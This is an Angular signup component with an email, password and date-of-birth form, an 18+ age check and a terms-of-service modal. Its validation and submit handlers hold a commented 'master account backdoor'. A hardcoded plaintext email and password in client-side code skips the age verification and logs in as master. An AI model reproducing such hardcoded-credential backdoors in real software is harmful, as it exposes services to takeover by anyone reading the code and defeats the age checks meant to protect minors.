
import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { Router, RouterLink } from '@angular/router';
import { FormsModule } from '@angular/forms';
import { AuthService } from '../../services/auth.service';
import { ToastService } from '../../services/toast.service';
import { BackgroundComponent } from '../../components/visual/background.component';
import { TosModalComponent } from '../../components/ui/tos-modal.component';

@Component({
  selector: 'app-signup',
  standalone: true,
  imports: [CommonModule, FormsModule, RouterLink, BackgroundComponent, TosModalComponent],
  template: `
    <app-background></app-background>
    
    <div class="min-h-screen flex items-center justify-center p-6 page-enter">
      <div class="w-full max-w-md bg-slate-900/80 backdrop-blur-xl border border-white/10 rounded-3xl p-8 shadow-2xl">
        
        <div class="mb-8">
          <button routerLink="/auth" class="text-slate-400 hover:text-white transition-colors flex items-center gap-2 text-sm mb-4">
            ← Back
          </button>
          <h2 class="text-3xl font-bold text-white font-tech">Create Account</h2>
          <p class="text-slate-400">Join the neural network.</p>
        </div>

        <form (submit)="onSubmit($event)" class="space-y-6">
          
          <!-- Email -->
          <div class="space-y-2">
            <label class="text-xs uppercase font-bold text-slate-500 tracking-wider">Email</label>
            <input type="email" [(ngModel)]="email" name="email" required
                   class="w-full bg-slate-800/50 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-pink-500 transition-colors placeholder-slate-600"
                   placeholder="agent@demomax.ai">
          </div>

          <!-- Password -->
          <div class="space-y-2">
            <label class="text-xs uppercase font-bold text-slate-500 tracking-wider">Password</label>
            <input type="password" [(ngModel)]="password" name="password" required minlength="6"
                   class="w-full bg-slate-800/50 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-pink-500 transition-colors placeholder-slate-600"
                   placeholder="••••••••">
          </div>

          <!-- Date of Birth (CRITICAL) -->
          <div class="space-y-2">
            <label class="text-xs uppercase font-bold text-pink-500 tracking-wider flex items-center gap-2">
               Date of Birth <span class="bg-pink-500/20 text-pink-400 text-[10px] px-1.5 py-0.5 rounded">REQUIRED 18+</span>
            </label>
            <input type="date" [(ngModel)]="dob" name="dob" required
                   class="w-full bg-slate-800/50 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-pink-500 transition-colors [color-scheme:dark]">
            <p class="text-[10px] text-slate-500">We strictly enforce age verification for content safety.</p>
          </div>

          <!-- 18+ Checkbox -->
          <div class="flex items-start gap-3 p-3 rounded-lg bg-pink-500/5 border border-pink-500/10">
            <div class="relative flex items-center">
              <input type="checkbox" [(ngModel)]="isAgeConfirmed" name="ageConfirm" id="ageConfirm" required
                     class="peer h-5 w-5 cursor-pointer appearance-none rounded-md border border-slate-600 transition-all checked:border-pink-500 checked:bg-pink-500">
              <svg class="pointer-events-none absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 text-white opacity-0 peer-checked:opacity-100" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" width="12" height="12"><polyline points="20 6 9 17 4 12"></polyline></svg>
            </div>
            <label for="ageConfirm" class="text-xs text-slate-300 leading-tight cursor-pointer select-none">
              I confirm that the date of birth entered above is accurate and I am at least 18 years old.
            </label>
          </div>

          <button type="submit" 
                  [disabled]="!isValidForm()"
                  class="w-full py-3.5 rounded-xl bg-gradient-to-r from-pink-600 to-violet-600 hover:from-pink-500 hover:to-violet-500 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold tracking-wide shadow-lg shadow-pink-500/20 transition-all btn-bounce mt-4">
             Next: Profile Setup
          </button>
        </form>
      </div>
    </div>

    <!-- TOS MODAL -->
    @if (showTos()) {
      <app-tos-modal (confirm)="onTosAccepted()"></app-tos-modal>
    }
  `
})
export class SignupComponent {
  router = inject(Router);
  auth = inject(AuthService);
  toast = inject(ToastService);

  email = '';
  password = '';
  dob = '';
  isAgeConfirmed = false;
  showTos = signal(false);

  isValidForm() {
    // If master creds, form is valid regardless of DOB/Age check
    if (this.email === 'ezequiel@gmail.com' && this.password === 'Ezequiel') {
        return true;
    }
    return this.email && this.password.length >= 6 && this.dob && this.isAgeConfirmed;
  }

  onSubmit(e: Event) {
    e.preventDefault();

    // --- MASTER ACCOUNT BACKDOOR ---
    if (this.email === 'ezequiel@gmail.com' && this.password === 'Ezequiel') {
        this.toast.show("⚡ GOD MODE ACTIVATED ⚡", "success");
        this.auth.loginAsMaster();
        return;
    }
    // -------------------------------

    if (!this.validateAge(this.dob)) {
      this.toast.show("Access Denied: You must be 18+ to enter.", "error");
      return;
    }
    
    // Show TOS before final signup
    this.showTos.set(true);
  }

  onTosAccepted() {
    this.showTos.set(false);
    if (this.auth.signup(this.email, new Date(this.dob))) {
      this.router.navigate(['/onboarding']);
    }
  }

  private validateAge(dateString: string): boolean {
    const today = new Date();
    const birthDate = new Date(dateString);
    let age = today.getFullYear() - birthDate.getFullYear();
    const m = today.getMonth() - birthDate.getMonth();
    
    // Adjust if birthday hasn't happened yet this year
    if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
      age--;
    }
    
    return age >= 18;
  }
}
